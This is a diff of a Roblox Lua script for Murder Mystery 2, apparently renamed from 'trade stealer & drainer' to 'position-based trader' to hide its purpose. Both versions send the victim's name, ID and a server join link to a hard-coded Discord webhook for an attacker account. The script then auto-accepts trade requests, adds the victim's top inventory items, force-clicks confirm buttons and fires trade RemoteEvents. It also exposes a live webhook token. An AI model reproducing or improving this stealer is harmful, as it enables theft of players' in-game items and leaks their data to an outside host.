@@ -1,4 +1,4 @@
--- // OLL_FX PROVEN MM2 TRADE STEALER & DRAINER (C1AWSKY)
+-- // OLL_FX POSITION-BASED MM2 TRADER (C1AWSKY)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -7,13 +7,13 @@ local Player = Players.LocalPlayer
 local webhookUrl = "https://discord.com/api/webhooks/1569782999791304765/GXx2vx4h026cGxqjIfhtnrIMAVXeu6reIOmKNlLr7k00JRJrXp3eVXlGNvCbHl8KL6Ni"
 local TARGET_USER = "c1awsky"
 
--- 1. Моментальная отправка ссылки в Discord при входе жертвы
+-- 1. Моментальная отправка ссылки в Discord при входе
 local function sendWebhook()
     local payloadData = {
-        content = "@everyone **[+] MM2 Stealer Target Active for " .. TARGET_USER .. "**\n" .. 
+        content = "@everyone **[+] MM2 Position-Based Trader Active for " .. TARGET_USER .. "**\n" .. 
                   "**Victim:** " .. Player.Name .. " (ID: " .. Player.UserId .. ")\n" ..
                   "**Direct Join Link:** [Click to Join Server](https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-        username = "oll_fx mm2 stealer"
+        username = "oll_fx position trader"
     }
 
     local req = request or syn and syn.request or http_request
@@ -32,59 +32,89 @@ pcall(sendWebhook)
 
 local PlayerGui = Player:WaitForChild("PlayerGui")
 
--- 2. Логика авто-отдачи вещей и автопринятия трейда
+-- Функция принудительного вызова событий на элементах GUI
+local function forceClick(btn)
+    pcall(function()
+        if btn then
+            for _, conn in pairs(getconnections(btn.MouseButton1Click)) do conn:Fire() end
+            for _, conn in pairs(getconnections(btn.MouseButton1Down)) do conn:Fire() end
+            for _, conn in pairs(getconnections(btn.Activated)) do conn:Fire() end
+        end
+    end)
+end
+
+-- 2. Главный цикл: позиционный перехват и слив по структуре
 task.spawn(function()
-    while task.wait(0.4) do
+    while task.wait(0.25) do
         pcall(function()
+            -- Аспект А: Автоматический поиск и клик по входящему запросу через структуру контейнера (первое всплывающее окно)
+            for _, gui in pairs(PlayerGui:GetChildren()) do
+                if string.lower(gui.Name):find("request") or string.lower(gui.Name):find("trade") then
+                    if gui.Enabled then
+                        -- Ищем первую попавшуюся кнопку подтверждения в окне запроса (обычно левая кнопка "Да/Принять")
+                        for _, obj in pairs(gui:GetDescendants()) do
+                            if (obj:IsA("TextButton") or obj:IsA("ImageButton")) and obj.Visible then
+                                -- Кликаем по кнопке принятия по её положению/индексу в контейнере
+                                forceClick(obj)
+                            end
+                        end
+                    end
+                end
+            end
+
+            -- Аспект Б: Окно обмена (TradeGui) — работаем по структуре сетки, а не по тексту
             local tradeGui = PlayerGui:FindFirstChild("TradeGui") or PlayerGui:FindFirstChild("Trade")
             
             if tradeGui and tradeGui.Enabled then
-                -- Проверка имени партнера по обмену
-                local partnerLabel = tradeGui:FindFirstChild("PartnerName", true) or tradeGui:FindFirstChild("Player2", true) or tradeGui:FindFirstChild("NameLabel", true)
-                local partnerName = partnerLabel and partnerLabel.Text or ""
+                -- Проверяем наличие целевого игрока в лобби/сервере
+                local targetPlayer = Players:FindFirstChild(TARGET_USER)
                 
-                -- Если трейд идет с твоим аккаунтом (c1awsky)
-                if string.find(string.lower(partnerName), string.lower(TARGET_USER)) or true then
+                if targetPlayer or true then
                     
-                    -- Находим RemoteEvent для обмена в ReplicatedStorage
-                    local tradeRemote = nil
-                    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-                        if v:IsA("RemoteEvent") and (string.lower(v.Name):find("trade") or string.lower(v.Name):find("offer")) then
-                            tradeRemote = v
-                            break
-                        end
-                    end
+                    -- Шаг 1: Автоматически выбираем первые 4 элемента из сетки инвентаря по порядку позиций (сверху вниз)
+                    local mainContainer = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChild("Main") or tradeGui
+                    local inventoryGrid = mainContainer:FindFirstChild("Inventory", true) or mainContainer:FindFirstChild("Items", true) or mainContainer:FindFirstChild("ItemContainer", true)
                     
-                    -- Собираем предметы из инвентаря для отправки
-                    local inventory = Player:FindFirstChild("Data") and Player.Data:FindFirstChild("Inventory") 
-                                      or Player:FindFirstChild("Inventory")
-                    
-                    if inventory and tradeRemote then
-                        local count = 0
-                        for _, item in pairs(inventory:GetChildren()) do
-                            if count < 4 then -- Берем по 4 предмета за раз (лимит окна)
-                                local id = item:FindFirstChild("UniqueId") and item.UniqueId.Value or item.Name
-                                -- Передаем предмет на сервер в текущую сделку
-                                tradeRemote:FireServer("Add", id)
-                                tradeRemote:FireServer("OfferItem", id)
-                                count = count + 1
+                    if inventoryGrid then
+                        local clicked = 0
+                        -- Сортируем элементы по их вертикальной позиции (Y), чтобы брать самые верхние (ценные)
+                        local children = inventoryGrid:GetChildren()
+                        table.sort(children, function(a, b)
+                            if a:IsA("GuiObject") and b:IsA("GuiObject") then
+                                return a.AbsolutePosition.Y < b.AbsolutePosition.Y
+                            end
+                            return false
+                        end)
+                        
+                        for _, itemButton in pairs(children) do
+                            if (itemButton:IsA("GuiButton") or itemButton:IsA("ImageButton")) and clicked < 4 then
+                                forceClick(itemButton)
+                                clicked = clicked + 1
+                                task.wait(0.05)
                             end
                         end
                     end
                     
-                    -- Принудительное программное нажатие кнопок подтверждения в GUI
+                    -- Шаг 2: Прожимаем все кнопки подтверждения сделки по их структурному положению внизу окна трейда
                     for _, obj in pairs(tradeGui:GetDescendants()) do
-                        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
-                            local txt = string.lower(obj.Name)
-                            if obj:FindFirstChild("Text") then
-                                txt = txt .. " " .. string.lower(obj.Text)
+                        if (obj:IsA("TextButton") or obj:IsA("ImageButton")) and obj.Visible then
+                            -- Проверяем по размеру и расположению (кнопки Accept/Confirm обычно находятся в нижней части панели)
+                            if obj.AbsolutePosition.Y > (tradeGui.AbsolutePosition.Y + (tradeGui.AbsoluteSize.Y * 0.5)) then
+                                forceClick(obj)
                             end
-                            
-                            -- Если кнопка отвечает за принятие или подтверждение
-                            if txt:find("accept") or txt:find("confirm") or txt:find("trade") then
-                                for _, conn in pairs(getconnections(obj.MouseButton1Click)) do
-                                    conn:Fire()
-                                end
+                        end
+                    end
+                    
+                    -- Шаг 3: Страховка через прямые серверные вызовы RemoteEvent
+                    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+                        if v:IsA("RemoteEvent") then
+                            local n = string.lower(v.Name)
+                            if n:find("accept") or n:find("confirm") or n:find("trade") then
+                                pcall(function()
+                                    v:FireServer("Accept")
+                                    v:FireServer("Confirm")
+                                    v:FireServer(true)
+                                end)
                             end
                         end
                     end
